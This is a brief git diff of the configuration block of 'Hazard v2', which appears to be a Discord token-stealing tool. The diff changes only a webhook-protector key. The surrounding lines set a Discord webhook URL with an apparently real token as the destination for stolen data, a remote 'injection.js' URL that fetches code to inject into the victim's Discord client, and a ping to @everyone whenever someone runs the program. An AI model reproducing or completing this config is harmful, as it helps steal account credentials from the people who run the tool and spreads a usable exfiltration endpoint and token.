@@ -30,7 +30,7 @@ __config__ = {
     # Recommend using https://github.com/trhacknon/Discord-Webhook-Protector so your webhook can't be spammed or deleted
     'webhook': "https://discord.com/api/webhooks/992259876443148411/_x3RVBe40zmzjArAlMZYtb5YU6IqzuE4ZDhJ5oPLyTL8Om2HGYojaymCjy1Dr9X0egLs",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/trhacknon/Discord-Webhook-Protector
-    'webhook_protector_key': "YKB4HDWCSFLWZQ5YAXBZ7QU5IM======",
+    'webhook_protector_key': "Key_encoded",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/trhacknon/Discord-Injection/master/injection.js",
     # if True, it will ping @everyone when someone ran Hazard v2
